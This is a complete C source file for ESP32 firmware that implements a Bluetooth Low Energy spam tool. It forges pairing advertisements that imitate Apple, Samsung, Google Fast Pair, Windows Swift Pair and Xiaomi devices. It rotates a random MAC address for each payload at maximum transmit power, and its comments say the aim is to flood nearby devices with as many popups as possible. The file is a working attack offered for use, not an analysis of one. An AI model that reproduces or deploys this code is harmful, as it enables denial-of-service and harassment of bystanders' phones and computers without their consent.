#include "ble_spam.h"

#include <string.h>
#include <stdlib.h>
#include <inttypes.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "esp_bt.h"

#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/util/util.h"
#include "os/os_mbuf.h"

#include "io.h"
#include "ble_scanner.h"
#include "ble_spectrum.h"
#include "wifi_spam.h"

static const char *TAG = "ble_spam";

/* ============================================================
 * Configuration
 * ============================================================ */
#define SPAM_INSTANCE_BASE   1
#define SPAM_INSTANCE        SPAM_INSTANCE_BASE
#define PAD_LEN              31     /* max legacy AD payload */

#define ADV_INTERVAL_MIN     0x20   /* 20 ms = hardware min legacy */
#define ADV_INTERVAL_MAX     0x20

#define DWELL_MS_MIN         250    /* minimum dwell per payload */
#define DWELL_MS_MAX         1000
#define DWELL_CHUNK_MS       50     /* responsive stop */

#define SLOT_MS              2000   /* android/all switching slot */

#if defined(CONFIG_BT_NIMBLE_MAX_EXT_ADV_INSTANCES)
#if (SPAM_INSTANCE_BASE + 1) > CONFIG_BT_NIMBLE_MAX_EXT_ADV_INSTANCES
#error "SPAM_INSTANCE exceeds CONFIG_BT_NIMBLE_MAX_EXT_ADV_INSTANCES"
#endif
#endif

/* ============================================================
 * State
 * ============================================================ */
static SemaphoreHandle_t s_lock = NULL;
static TaskHandle_t      s_task = NULL;
static volatile bool     s_running = false;
static ble_spam_type_t   s_current_type = BLE_SPAM_APPLE_JUICE;
static uint32_t          s_delay_ms = DWELL_MS_MIN;
static uint32_t          s_duration_sec = 0;
static int64_t           s_started_us = 0;
static volatile uint32_t s_cycles_sent = 0;
static uint32_t          s_fail_count = 0;
static uint8_t           s_own_addr_type = BLE_OWN_ADDR_PUBLIC;
static bool              s_addr_ready = false;

/* ============================================================
 * Apple Continuity — color tables & model table
 * ============================================================ */
typedef struct { uint8_t value; const char* name; } ir_color_t;

static const ir_color_t colors_white[] = {{0x00,"White"}};
static const ir_color_t colors_airpods_max[] = {
    {0x00,"White"},{0x02,"Red"},{0x03,"Blue"},{0x0F,"Black"},{0x11,"Light Green"}};
static const ir_color_t colors_beats_flex[] = {{0x00,"White"},{0x01,"Black"}};
static const ir_color_t colors_beats_solo_3[] = {
    {0x00,"White"},{0x01,"Black"},{0x06,"Gray"},{0x07,"Gold/White"},{0x08,"Rose Gold"},
    {0x09,"Black"},{0x0E,"Violet/White"},{0x0F,"Bright Red"},{0x12,"Dark Red"},
    {0x13,"Swamp Green"},{0x14,"Dark Gray"},{0x15,"Dark Blue"},{0x1D,"Rose Gold 2"},
    {0x20,"Blue/Green"},{0x21,"Purple/Orange"},{0x22,"Deep Blue/Light blue"},
    {0x23,"Magenta/Light Fuchsia"},{0x25,"Black/Red"},{0x2A,"Gray/Disney LTD"},
    {0x2E,"Pinkish white"},{0x3D,"Red/Blue"},{0x3E,"Yellow/Blue"},{0x3F,"White/Red"},
    {0x40,"Purple/White"},{0x5B,"Gold"},{0x5C,"Silver"}};
static const ir_color_t colors_powerbeats_3[] = {
    {0x00,"White"},{0x01,"Black"},{0x0B,"Gray/Blue"},{0x0C,"Gray/Red"},
    {0x0D,"Gray/Green"},{0x12,"Red"},{0x13,"Swamp Green"},{0x14,"Gray"},
    {0x15,"Deep Blue"},{0x17,"Dark with Gold Logo"}};
static const ir_color_t colors_powerbeats_pro[] = {
    {0x00,"White"},{0x02,"Yellowish Green"},{0x03,"Blue"},{0x04,"Black"},
    {0x05,"Pink"},{0x06,"Red"},{0x0B,"Gray ?"},{0x0D,"Sky Blue"}};
static const ir_color_t colors_beats_solo_pro[] = {{0x00,"White"},{0x01,"Black"}};
static const ir_color_t colors_beats_studio_buds[] = {
    {0x00,"White"},{0x01,"Black"},{0x02,"Red"},{0x03,"Blue"},{0x04,"Pink"},{0x06,"Silver"}};
static const ir_color_t colors_beats_x[] = {
    {0x00,"White"},{0x01,"Black"},{0x02,"Blue"},{0x05,"Gray"},{0x1D,"Pink"},{0x25,"Dark/Red"}};
static const ir_color_t colors_beats_studio_3[] = {
    {0x00,"White"},{0x01,"Black"},{0x02,"Red"},{0x03,"Blue"},{0x18,"Shadow Gray"},
    {0x19,"Desert Sand"},{0x25,"Black/Red"},{0x26,"Midnight Black"},
    {0x27,"Desert Sand 2"},{0x28,"Gray"},{0x29,"Clear blue/gold"},
    {0x42,"Green Forest camo"},{0x43,"White Camo"}};
static const ir_color_t colors_beats_studio_pro[] = {{0x00,"White"},{0x01,"Black"}};
static const ir_color_t colors_beats_fit_pro[] = {
    {0x00,"White"},{0x01,"Black"},{0x02,"Pink"},{0x03,"Grey/White"},
    {0x04,"Full Pink"},{0x05,"Neon Green"},{0x06,"Night Blue"},
    {0x07,"Light Pink"},{0x08,"Brown"},{0x09,"Dark Brown"}};
static const ir_color_t colors_beats_studio_buds_plus[] = {
    {0x00,"Black"},{0x01,"White"},{0x02,"Transparent"},{0x03,"Silver"},{0x04,"Pink"}};

typedef struct {
    uint16_t value;
    const char* name;
    const ir_color_t* colors;
    const uint8_t colors_count;
} apple_pp_model_t;

static const apple_pp_model_t apple_pp_models[] = {
    {0x0E20,"AirPods Pro",           colors_white,                   1},
    {0x0A20,"AirPods Max",           colors_airpods_max,             5},
    {0x0055,"Airtag",                colors_white,                   1},
    {0x0030,"Hermes Airtag",         colors_white,                   1},
    {0x0220,"AirPods",               colors_white,                   1},
    {0x0F20,"AirPods 2nd Gen",       colors_white,                   1},
    {0x1320,"AirPods 3rd Gen",       colors_white,                   1},
    {0x1420,"AirPods Pro 2nd Gen",   colors_white,                   1},
    {0x1020,"Beats Flex",            colors_beats_flex,              2},
    {0x0620,"Beats Solo 3",          colors_beats_solo_3,            26},
    {0x0320,"Powerbeats 3",          colors_powerbeats_3,            10},
    {0x0B20,"Powerbeats Pro",        colors_powerbeats_pro,          8},
    {0x0C20,"Beats Solo Pro",        colors_beats_solo_pro,          2},
    {0x1120,"Beats Studio Buds",     colors_beats_studio_buds,       6},
    {0x0520,"Beats X",               colors_beats_x,                 6},
    {0x0920,"Beats Studio 3",        colors_beats_studio_3,          13},
    {0x1720,"Beats Studio Pro",      colors_beats_studio_pro,        2},
    {0x1220,"Beats Fit Pro",         colors_beats_fit_pro,           10},
    {0x1620,"Beats Studio Buds+",    colors_beats_studio_buds_plus,  5},
};
#define APPLE_PP_MODELS_N (sizeof(apple_pp_models) / sizeof(apple_pp_models[0]))

static const uint8_t apple_na_actions[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E,
    0x09, 0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B,
};
#define APPLE_NA_ACTIONS_N (sizeof(apple_na_actions))

static const uint8_t apple_pp_prefixes[] = { 0x07, 0x01, 0x05 };
#define APPLE_PP_PREFIXES_N (sizeof(apple_pp_prefixes))

/* ============================================================
 * Samsung EasySetup — VERIFIED 28-byte payload
 * (byte 0x46 pada posisi 17 WAJIB ada — ini yang hilang sebelumnya)
 * ============================================================ */
static const uint8_t SAMSUNG_BUDS_2_PRO_PAYLOAD[] = {
    0x1B, 0xFF, 0x75, 0x00,
    0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21,
    0x01, 0x09, 0xAB, 0x0C, 0x01, 0x46, 0x06, 0x3C, 0xDD,
    0x0A, 0x00, 0x00, 0x00, 0x00, 0xA7, 0x00
};
#define SAMSUNG_BUDS_2_PRO_LEN (sizeof(SAMSUNG_BUDS_2_PRO_PAYLOAD))

static const uint8_t SAMSUNG_WATCH_IDS[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
    0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0xE4, 0xE5, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0xEC, 0xEF,
};
#define SAMSUNG_WATCH_N (sizeof(SAMSUNG_WATCH_IDS))

/* ============================================================
 * Google Fast Pair model IDs
 * ============================================================ */
static const uint8_t FASTPAIR_MODELS[][3] = {
    {0x00,0x00,0x47}, {0x00,0x01,0xF0}, {0xCD,0x82,0x56},
    {0x92,0xBB,0xBD}, {0x00,0x00,0x06}, {0x71,0x8F,0xA4},
    {0xD4,0x46,0xA7}, {0x2D,0x7A,0x23}, {0x0E,0x30,0xC3},
    {0x72,0xEF,0x8D}, {0x72,0xFB,0x00}, {0xF5,0x24,0x94},
    {0x82,0x1F,0x66}, {0x05,0x77,0xB1}, {0x05,0xA9,0xBC},
};
#define FASTPAIR_MODELS_N (sizeof(FASTPAIR_MODELS) / 3)

/* ============================================================
 * Swift Pair names
 * ============================================================ */
static const char *SWIFTPAIR_NAMES[] = {
    "Surface Keyboard",       "Surface Precision Mouse", "Surface Headphones",
    "Surface Earbuds",        "Surface Pen",             "Surface Mobile Mouse",
    "Arc Mouse",              "Modern Mobile Mouse",     "Surface Dock",
    "Surface Dial",           "Xbox Wireless Controller","Surface Audio",
    "Surface Pro",            "Surface Laptop",          "Surface Go",
    "Bluetooth Keyboard",
};
#define SWIFTPAIR_NAMES_N (sizeof(SWIFTPAIR_NAMES) / sizeof(SWIFTPAIR_NAMES[0]))

/* ============================================================
 * Xiaomi MiBeacon codes
 * ============================================================ */
static const uint16_t XIAOMI_DEVICE_CODES[] = {
    0x01AA, 0x045B, 0x055B, 0x06D3, 0x0387, 0x2832, 0x55B5, 0x0B48, 0x1203,
    0x07F6, 0x0A8D, 0x03DD, 0x3531, 0x2AEB, 0x098B, 0x1889, 0x0098, 0x03BC,
    0x015D, 0x0153, 0x068E, 0x04E6, 0x1568, 0x1569, 0x0DFD, 0x1949, 0x2387,
    0x3A61, 0x0C3C, 0x0576, 0x066F, 0x0347, 0x03D6, 0x0A83, 0x02DF, 0x0997,
    0x1C10, 0x16E4, 0x2542, 0x04E9, 0x00DB, 0x0391, 0x0489, 0x0806, 0x1790,
    0x0863, 0x045C, 0x040A, 0x04E1, 0x098C, 0x0784, 0x0E39, 0x07BF, 0x03BF,
    0x03B6, 0x0083, 0x0113, 0x069E, 0x069F, 0x0380, 0x0DE7, 0x20DB,
};
#define XIAOMI_DEVICE_CODES_N \
    (sizeof(XIAOMI_DEVICE_CODES) / sizeof(XIAOMI_DEVICE_CODES[0]))

/* ============================================================
 * Helpers
 * ============================================================ */
static bool ensure_addr(void)
{
    if (s_addr_ready) return true;
    int rc = ble_hs_util_ensure_addr(0);
    if (rc != 0) { ESP_LOGE(TAG, "ensure_addr rc=%d", rc); return false; }
    rc = ble_hs_id_infer_auto(0, &s_own_addr_type);
    if (rc != 0) { ESP_LOGE(TAG, "infer_auto rc=%d", rc); return false; }
    s_addr_ready = true;
    ESP_LOGI(TAG, "own_addr_type=%u", s_own_addr_type);
    return true;
}

static bool validate_ad(const uint8_t *data, size_t len)
{
    size_t i = 0;
    bool saw_element = false;
    while (i < len) {
        uint8_t l = data[i];
        if (l == 0) break;
        if (i + 1 + l > len) return false;
        saw_element = true;
        i += 1 + l;
    }
    return saw_element;
}

static void dump_payload(const char *label, const uint8_t *data, size_t len)
{
    char hex[3 * PAD_LEN + 4];
    static const char hexchars[] = "0123456789ABCDEF";
    size_t i, n = 0;
    if (len > PAD_LEN) len = PAD_LEN;
    for (i = 0; i < len; i++) {
        hex[n++] = hexchars[(data[i] >> 4) & 0xF];
        hex[n++] = hexchars[data[i] & 0xF];
        hex[n++] = ' ';
    }
    hex[n] = 0;
    ESP_LOGI(TAG, "  %s [%u] %s", label, (unsigned)len, hex);
}

/* ============================================================
 * GAP handler — minimal, never terminates a connection
 * ============================================================ */
static int ble_gap_event_handler(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        /* With ADV_NONCONN_IND this should NEVER fire. If it does, ignore —
         * do NOT terminate. Terminating is what killed Apple popups. */
        ESP_LOGW(TAG, "unexpected CONNECT status=%d", event->connect.status);
    }
    return 0;
}

/* ============================================================
 * transmit_payload — stop / set_addr / set_data / start
 *
 * MAC dirotasi per payload untuk SEMUA tipe (bukan hanya non-FastPair).
 * Ini yang membuat Fast Pair menghasilkan banyak popup, bukan 1-2.
 * ============================================================ */
static int transmit_payload(uint8_t instance, const uint8_t *data, size_t len)
{
    if (len == 0 || len > PAD_LEN) {
        ESP_LOGE(TAG, "payload len=%u out of range", (unsigned)len);
        return BLE_HS_EINVAL;
    }

    /* Stop advertiser. EALREADY / ENOENT are tolerated; anything else means
     * the controller isn't in a good state for set_addr. Bail out. */
    int stop_rc = ble_gap_ext_adv_stop(instance);
    if (stop_rc != 0 &&
        stop_rc != BLE_HS_EALREADY &&
        stop_rc != BLE_HS_ENOENT) {
        ESP_LOGW(TAG, "stop rc=%d", stop_rc);
        return stop_rc;
    }

    /* Fresh static-random MAC (top two bits = 0b11) */
    ble_addr_t addr;
    addr.type = BLE_ADDR_RANDOM;
    for (int i = 0; i < 6; i++) addr.val[i] = (uint8_t)(esp_random() & 0xFF);
    addr.val[5] = (addr.val[5] & 0x3F) | 0xC0;

    int rc = ble_gap_ext_adv_set_addr(instance, &addr);
    if (rc != 0) {
        ESP_LOGW(TAG, "set_addr rc=%d", rc);
        return rc;
    }

    /* Set payload. ble_gap_ext_adv_set_data() frees `om` on both success
     * and error paths (per ESP-IDF NimBLE), so we must not free it here. */
    struct os_mbuf *om = os_msys_get_pkthdr((uint16_t)len, 0);
    if (!om) return BLE_HS_ENOMEM;
    rc = os_mbuf_append(om, data, (uint16_t)len);
    if (rc != 0) { os_mbuf_free_chain(om); return rc; }
    rc = ble_gap_ext_adv_set_data(instance, om);
    if (rc != 0) {
        ESP_LOGW(TAG, "set_data rc=%d len=%u", rc, (unsigned)len);
        return rc;
    }

    /* Start (indefinite duration, unlimited events) */
    rc = ble_gap_ext_adv_start(instance, 0, 0);
    if (rc != 0 && rc != BLE_HS_EALREADY) {
        ESP_LOGW(TAG, "start rc=%d", rc);
        return rc;
    }
    return 0;
}

/* ============================================================
 * Configure — NON-CONNECTABLE, NON-SCANNABLE, legacy PDU
 * ============================================================ */
static int configure_instance(uint8_t instance)
{
    struct ble_gap_ext_adv_params params = {0};
    params.own_addr_type  = BLE_OWN_ADDR_RANDOM;
    params.primary_phy    = BLE_HCI_LE_PHY_1M;
    params.secondary_phy  = BLE_HCI_LE_PHY_1M;
    params.sid            = (uint8_t)(instance & 0x0F);
    params.connectable    = 0;
    params.scannable      = 0;
    params.legacy_pdu     = 1;      /* ADV_NONCONN_IND */
    params.itvl_min       = ADV_INTERVAL_MIN;
    params.itvl_max       = ADV_INTERVAL_MAX;
    params.tx_power       = 0;

    int rc = ble_gap_ext_adv_configure(instance, &params,
                                        NULL, ble_gap_event_handler, NULL);
    if (rc != 0 && rc != BLE_HS_EALREADY) {
        ESP_LOGE(TAG, "ext_adv_configure rc=%d", rc);
        return rc;
    }
    return 0;
}

static void stop_all_instances(void)
{
    ble_gap_ext_adv_stop(SPAM_INSTANCE);
    ble_gap_ext_adv_remove(SPAM_INSTANCE);
}

/* ============================================================
 * Payload builders — verified byte counts
 * ============================================================ */

/* 31 bytes — Apple Proximity Pair */
static size_t build_apple_proximity_pair(uint8_t *out)
{
    size_t idx = esp_random() % APPLE_PP_MODELS_N;
    uint16_t model = apple_pp_models[idx].value;
    uint8_t colors_count = apple_pp_models[idx].colors_count;
    uint8_t color = apple_pp_models[idx].colors[esp_random() % colors_count].value;

    uint8_t prefix = (model == 0x0055 || model == 0x0030)
                     ? 0x05
                     : apple_pp_prefixes[esp_random() % APPLE_PP_PREFIXES_N];

    size_t i = 0;
    out[i++] = 30;                             /* AD length = 30 */
    out[i++] = 0xFF;                           /* manufacturer specific */
    out[i++] = 0x4C; out[i++] = 0x00;          /* Apple */
    out[i++] = 0x07;                           /* Proximity Pair */
    out[i++] = 25;                             /* sub-length */
    out[i++] = prefix;
    out[i++] = (model >> 0x08) & 0xFF;
    out[i++] = (model >> 0x00) & 0xFF;
    out[i++] = 0x55;
    out[i++] = (uint8_t)(((esp_random() % 10) << 4) + (esp_random() % 10));
    out[i++] = (uint8_t)(((esp_random() %  8) << 4) + (esp_random() % 10));
    out[i++] = (uint8_t)(esp_random() & 0xFF);
    out[i++] = color;
    out[i++] = 0x00;
    esp_fill_random(&out[i], 16); i += 16;
    return i;  /* 31 */
}

/* 11 bytes — Apple Nearby Action (SourApple) */
static size_t build_apple_nearby_action(uint8_t *out)
{
    uint8_t action = apple_na_actions[esp_random() % APPLE_NA_ACTIONS_N];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() & 1)) flags--;
    if (action == 0x09 && (esp_random() & 1)) flags = 0x40;

    size_t i = 0;
    out[i++] = 10;                             /* AD length = 10 */
    out[i++] = 0xFF;
    out[i++] = 0x4C; out[i++] = 0x00;
    out[i++] = 0x0F;                           /* Nearby Action */
    out[i++] = 0x05;
    out[i++] = flags;
    out[i++] = action;
    esp_fill_random(&out[i], 3); i += 3;
    return i;  /* 11 */
}

/* 15 bytes — Samsung Galaxy Watch */
static size_t build_samsung_watch(uint8_t *out)
{
    uint8_t id = SAMSUNG_WATCH_IDS[esp_random() % SAMSUNG_WATCH_N];
    size_t i = 0;
    out[i++] = 14;
    out[i++] = 0xFF;
    out[i++] = 0x75; out[i++] = 0x00;
    out[i++] = 0x01; out[i++] = 0x00; out[i++] = 0x02; out[i++] = 0x00;
    out[i++] = 0x01; out[i++] = 0x01; out[i++] = 0xFF; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x43;
    out[i++] = id;
    return i;  /* 15 */
}

/* 28 bytes — Samsung Galaxy Buds 2 Pro (verified) */
static size_t build_samsung_buds(uint8_t *out)
{
    memcpy(out, SAMSUNG_BUDS_2_PRO_PAYLOAD, SAMSUNG_BUDS_2_PRO_LEN);
    return SAMSUNG_BUDS_2_PRO_LEN;
}

/* 14 bytes — Google Fast Pair */
static size_t build_fastpair(uint8_t *out)
{
    const uint8_t *mid = FASTPAIR_MODELS[esp_random() % FASTPAIR_MODELS_N];

    size_t n = 0;
    out[n++] = 0x03; out[n++] = 0x03; out[n++] = 0x2C; out[n++] = 0xFE;
    out[n++] = 0x06; out[n++] = 0x16; out[n++] = 0x2C; out[n++] = 0xFE;
    out[n++] = mid[0]; out[n++] = mid[1]; out[n++] = mid[2];
    out[n++] = 0x02; out[n++] = 0x0A;
    out[n++] = 0x00;
    return n;  /* 14 */
}

/* 7 + name_len bytes — Windows Swift Pair */
static size_t build_swiftpair(uint8_t *out)
{
    const char *name = SWIFTPAIR_NAMES[esp_random() % SWIFTPAIR_NAMES_N];
    size_t name_len = strlen(name);
    if (name_len > PAD_LEN - 7) name_len = PAD_LEN - 7;
    size_t i = 0;
    out[i++] = (uint8_t)(name_len + 6);
    out[i++] = 0xFF;
    out[i++] = 0x06; out[i++] = 0x00;
    out[i++] = 0x03; out[i++] = 0x00; out[i++] = 0x80;
    memcpy(out + i, name, name_len); i += name_len;
    return i;
}

/* 28 bytes — Xiaomi MiBeacon */
static size_t build_xiaomi(uint8_t *out)
{
    uint16_t device_code =
        XIAOMI_DEVICE_CODES[esp_random() % XIAOMI_DEVICE_CODES_N];

    size_t i = 0;
    out[i++] = 0x1B; out[i++] = 0xFF; out[i++] = 0x8F; out[i++] = 0x03;
    out[i++] = 0x16; out[i++] = 0x01; out[i++] = 0x20;
    out[i++] = (device_code >> 8) & 0xFF;
    out[i++] = device_code & 0xFF;
    out[i++] = 0x17; out[i++] = 0x0A; out[i++] = 0x00; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x88; out[i++] = 0x50;
    out[i++] = 0x11; out[i++] = 0xB1; out[i++] = 0xFF;
    esp_fill_random(&out[i], 2); i += 2;
    memset(&out[i], 0, 6); i += 6;
    return i;  /* 28 */
}

/* ============================================================
 * pick_payload — no padding, exact length only
 * ============================================================ */
static size_t pick_payload(ble_spam_type_t type, uint8_t *out, size_t out_size)
{
    if (out_size < PAD_LEN) return 0;
    size_t len = 0;

    switch (type) {
        case BLE_SPAM_APPLE_JUICE:      len = build_apple_proximity_pair(out); break;
        case BLE_SPAM_SOUR_APPLE:       len = build_apple_nearby_action(out);  break;
        case BLE_SPAM_SAMSUNG:
            if (esp_random() & 1) len = build_samsung_buds(out);
            else                  len = build_samsung_watch(out);
            break;
        case BLE_SPAM_GOOGLE_FASTPAIR:  len = build_fastpair(out);       break;
        case BLE_SPAM_WINDOWS_SWIFTPAIR: len = build_swiftpair(out);     break;
        case BLE_SPAM_XIAOMI_MIBEACON:  len = build_xiaomi(out);         break;
        default: return 0;
    }

    if (len == 0 || len > PAD_LEN) return 0;
    if (!validate_ad(out, len)) {
        ESP_LOGW(TAG, "malformed payload type=%s len=%u",
                 ble_spam_type_name(type), (unsigned)len);
        return 0;
    }
    return len;
}

/* ============================================================
 * Main task
 * ============================================================ */
static void ble_spam_task(void *arg)
{
    (void)arg;
    s_started_us = esp_timer_get_time();
    s_cycles_sent = 0;
    s_fail_count = 0;
    uint32_t cycle = 0;
    uint32_t last_log_sec = 0;
    uint32_t dumped_types_mask = 0;

    if (!ensure_addr()) {
        vTaskDelay(pdMS_TO_TICKS(500));
        if (!ensure_addr()) {
            io_log("blespam: address resolution failed\r\n");
            goto exit;
        }
    }

    io_log("blespam: START type=%s delay=%ums dur=%us\r\n",
           ble_spam_type_name(s_current_type), (unsigned)s_delay_ms,
           (unsigned)s_duration_sec);

    uint8_t payload_buf[PAD_LEN];

    while (s_running) {
        /* Duration check */
        int64_t elapsed_ms = (esp_timer_get_time() - s_started_us) / 1000;
        if (s_duration_sec > 0 &&
            (uint32_t)(elapsed_ms / 1000) >= s_duration_sec) break;

        /* Re-read dwell each iteration so ble_spam_set_delay() is live */
        uint32_t dwell = s_delay_ms;
        if (dwell < DWELL_MS_MIN) dwell = DWELL_MS_MIN;
        if (dwell > DWELL_MS_MAX) dwell = DWELL_MS_MAX;

        uint32_t slot_cycles = SLOT_MS / dwell;
        if (slot_cycles < 1) slot_cycles = 1;

        /* Resolve effective type (All / Android use slot switching) */
        ble_spam_type_t type = s_current_type;
        if (type == BLE_SPAM_ALL) {
            type = (ble_spam_type_t)((cycle / slot_cycles) % 6);
        } else if (type == BLE_SPAM_ANDROID) {
            type = ((cycle / slot_cycles) & 1)
                 ? BLE_SPAM_GOOGLE_FASTPAIR
                 : BLE_SPAM_SAMSUNG;
        }

        size_t len = pick_payload(type, payload_buf, sizeof(payload_buf));
        if (len == 0) {
            vTaskDelay(pdMS_TO_TICKS(50));
            cycle++;
            continue;
        }

        /* Dump payload once per type per session */
        uint32_t bit = 1u << (uint32_t)type;
        if (!(dumped_types_mask & bit)) {
            dumped_types_mask |= bit;
            dump_payload(ble_spam_type_name(type), payload_buf, len);
        }

        int rc = transmit_payload(SPAM_INSTANCE, payload_buf, len);
        if (rc == 0) {
            s_cycles_sent++;
        } else if (s_fail_count < 5) {
            s_fail_count++;
            ESP_LOGW(TAG, "transmit rc=%d type=%s len=%u",
                     rc, ble_spam_type_name(type), (unsigned)len);
        }

        /* Chunked dwell — task responds to s_running within 50 ms */
        for (uint32_t waited = 0; waited < dwell && s_running; waited += DWELL_CHUNK_MS) {
            uint32_t chunk = dwell - waited;
            if (chunk > DWELL_CHUNK_MS) chunk = DWELL_CHUNK_MS;
            vTaskDelay(pdMS_TO_TICKS(chunk));
        }
        cycle++;

        /* Stats every 2 s */
        uint32_t sec = (uint32_t)((esp_timer_get_time() - s_started_us) / 1000000);
        if (sec - last_log_sec >= 2) {
            last_log_sec = sec;
            uint32_t fps = s_cycles_sent / sec;
            io_log("blespam: %us type=%s delay=%ums frames=%u fps=%u\r\n",
                   (unsigned)sec, ble_spam_type_name(type), (unsigned)dwell,
                   (unsigned)s_cycles_sent, (unsigned)fps);
        }
    }

    stop_all_instances();
    vTaskDelay(pdMS_TO_TICKS(20));

exit:
    s_running = false;
    s_task = NULL;
    io_log("blespam: STOPPED cycles=%u\r\n", (unsigned)s_cycles_sent);
    vTaskDelete(NULL);
}

/* ============================================================
 * Public API
 * ============================================================ */
static void ble_spam_selftest(void)
{
    static const ble_spam_type_t types[] = {
        BLE_SPAM_APPLE_JUICE, BLE_SPAM_SOUR_APPLE, BLE_SPAM_SAMSUNG,
        BLE_SPAM_GOOGLE_FASTPAIR, BLE_SPAM_WINDOWS_SWIFTPAIR,
        BLE_SPAM_XIAOMI_MIBEACON,
    };
    static const size_t expected_len[] = { 31, 11, 0, 14, 0, 28 };
    uint8_t buf[PAD_LEN];
    int ok = 0;
    for (size_t i = 0; i < sizeof(types) / sizeof(types[0]); i++) {
        bool type_ok = true;
        for (int draw = 0; draw < 8 && type_ok; draw++) {
            size_t len = pick_payload(types[i], buf, sizeof(buf));
            if (len == 0) { type_ok = false; break; }
            if (expected_len[i] != 0 && len != expected_len[i]) {
                ESP_LOGE(TAG, "selftest: %s len=%u expected=%u",
                         ble_spam_type_name(types[i]),
                         (unsigned)len, (unsigned)expected_len[i]);
                type_ok = false;
            }
        }
        if (type_ok) ok++;
        else ESP_LOGE(TAG, "selftest FAILED type=%s",
                      ble_spam_type_name(types[i]));
    }
    ESP_LOGI(TAG, "selftest: %d/%d payload builders OK",
             ok, (int)(sizeof(types) / sizeof(types[0])));
}

esp_err_t ble_spam_init(void)
{
    s_lock = xSemaphoreCreateMutex();
    if (!s_lock) return ESP_ERR_NO_MEM;

    esp_err_t tx_rc = esp_ble_tx_power_set_enhanced(
        ESP_BLE_ENHANCED_PWR_TYPE_ADV, 0, ESP_PWR_LVL_P20);
    if (tx_rc != ESP_OK) {
        ESP_LOGW(TAG, "enhanced tx power failed: %d", tx_rc);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P20);
    }
    ESP_LOGI(TAG, "TX power set to +20 dBm");

    ble_spam_selftest();
    return ESP_OK;
}

esp_err_t ble_spam_start(ble_spam_type_t type, uint32_t delay_ms,
                         uint32_t duration_sec)
{
    if (!s_lock) return ESP_ERR_INVALID_STATE;
    if (type >= BLE_SPAM_TYPE_COUNT) return ESP_ERR_INVALID_ARG;

    if (ble_scanner_is_running()) ble_scanner_stop();
    if (ble_spectrum_is_running()) ble_spectrum_stop();
    if (wifi_spam_is_running()) wifi_spam_stop();

    if (delay_ms < DWELL_MS_MIN) delay_ms = DWELL_MS_MIN;
    if (delay_ms > DWELL_MS_MAX) delay_ms = DWELL_MS_MAX;
    if (duration_sec > 3600) duration_sec = 3600;

    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_running || s_task != NULL) {
        xSemaphoreGive(s_lock);
        return ESP_ERR_INVALID_STATE;
    }

    stop_all_instances();

    int cfg_rc = configure_instance(SPAM_INSTANCE);
    if (cfg_rc != 0) {
        io_log("blespam: configure failed rc=%d\r\n", cfg_rc);
        stop_all_instances();
        xSemaphoreGive(s_lock);
        return ESP_FAIL;
    }

    s_current_type = type;
    s_delay_ms = delay_ms;
    s_duration_sec = duration_sec;
    s_running = true;

    BaseType_t ok = xTaskCreate(ble_spam_task, "ble_spam", 4096,
                                NULL, 4, &s_task);
    xSemaphoreGive(s_lock);
    if (ok != pdPASS) {
        s_running = false;
        s_task = NULL;
        stop_all_instances();
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

esp_err_t ble_spam_stop(void)
{
    if (!s_lock) return ESP_ERR_INVALID_STATE;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (!s_running) { xSemaphoreGive(s_lock); return ESP_ERR_INVALID_STATE; }
    s_running = false;
    xSemaphoreGive(s_lock);

    /* Task checks s_running every DWELL_CHUNK_MS (50 ms) so should exit
     * within ~100 ms. Give it up to 500 ms to be safe. */
    for (int i = 0; i < 50 && s_task != NULL; i++)
        vTaskDelay(pdMS_TO_TICKS(10));
    return ESP_OK;
}

esp_err_t ble_spam_set_delay(uint32_t delay_ms)
{
    if (delay_ms < DWELL_MS_MIN) delay_ms = DWELL_MS_MIN;
    if (delay_ms > DWELL_MS_MAX) delay_ms = DWELL_MS_MAX;
    s_delay_ms = delay_ms;
    return ESP_OK;
}

bool ble_spam_is_running(void) { return s_running; }
ble_spam_type_t ble_spam_current_type(void) { return s_current_type; }
uint32_t ble_spam_current_delay(void) { return s_delay_ms; }
uint32_t ble_spam_frames_sent(void) { return s_cycles_sent; }

uint32_t ble_spam_default_delay(ble_spam_type_t type)
{
    (void)type;
    return DWELL_MS_MIN;
}

const char *ble_spam_type_name(ble_spam_type_t type)
{
    switch (type) {
        case BLE_SPAM_APPLE_JUICE:      return "apple";
        case BLE_SPAM_SOUR_APPLE:        return "sourapple";
        case BLE_SPAM_SAMSUNG:           return "samsung";
        case BLE_SPAM_GOOGLE_FASTPAIR:   return "google";
        case BLE_SPAM_WINDOWS_SWIFTPAIR: return "windows";
        case BLE_SPAM_XIAOMI_MIBEACON:   return "xiaomi";
        case BLE_SPAM_ALL:               return "all";
        case BLE_SPAM_ANDROID:           return "android";
        default:                          return "?";
    }
}
